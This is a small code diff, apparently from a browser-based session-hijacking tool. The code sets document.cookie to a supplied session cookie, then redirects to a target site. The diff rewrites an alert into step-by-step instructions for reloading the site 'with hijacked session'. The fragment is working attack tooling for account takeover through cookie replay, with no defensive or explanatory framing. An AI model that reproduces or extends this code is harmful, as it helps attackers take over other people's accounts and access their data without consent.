@@ -354,7 +354,9 @@
                 document.cookie = sessionCookie + "; path=/";
               }
               
-              alert('✅ Cookie injected!\\n\\nDomain: ' + (domain || 'current') + '\\nRedirecting to: ' + targetURL);
+              alert('✅ Cookie injected!\\n\\nDomain: ' + (domain || 'current') + '\\n\\n⚠️ NEXT STEPS:\\n1. This will open the target site\\n2. Open DevTools (F12) → Console\\n3. Run: location.reload() to refresh with hijacked session\\n4. Or manually click around to trigger session check');
+              
+              // Open target in same window
               window.location.href = targetURL;
             }
             
